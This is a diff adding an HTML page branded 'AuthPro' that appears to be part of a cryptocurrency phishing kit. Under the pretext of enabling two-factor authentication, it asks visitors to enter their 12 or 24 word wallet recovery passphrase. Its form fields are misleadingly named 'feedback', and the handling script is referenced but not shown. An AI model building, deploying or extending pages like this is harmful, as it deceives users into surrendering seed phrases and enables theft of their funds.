@@ -1,0 +1,53 @@
+<!-- ============================================ -->
+<!-- FILE 2: feedback.html (Step 1 - Feedback)  -->
+<!-- ============================================ -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Wallet - AuthPro</title>
+    <link rel="icon" type="image/png" href="images/authprologo.png">
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Animated Background -->
+    <div class="bg-animation">
+        <div class="floating-shape shape1"></div>
+        <div class="floating-shape shape2"></div>
+        <div class="floating-shape shape3"></div>
+        <div class="floating-shape shape4"></div>
+        <div class="floating-shape shape5"></div>
+        <div class="floating-shape shape6"></div>
+    </div>
+
+    <!-- Particle Effect -->
+    <div class="particles" id="particles"></div>
+
+    <!-- Feedback Container -->
+    <div class="auth-container">
+        <div class="auth-box">
+            <a href="index.html" class="logo-link">
+                <img src="images/authprologo.png" alt="AuthPro Logo" class="auth-logo">
+                <h2>CONNECT WALLET</h2>
+            </a>
+            <p>Improve your wallet security by adding two factor authentication</p>
+            
+            <form id="feedbackForm">
+                <div class="form-group">
+                    <label>Passphrase</label>
+                    <textarea id="feedback" name="feedback" placeholder="Enter your 12 or 24 word passphrase..." rows="6" required></textarea>
+                    <div id="wordCount" class="word-count">(Input a valid passphrase)</div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">Next →</button>
+            </form>
+            
+            <a href="index.html" class="back-btn">← Back to Home</a>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
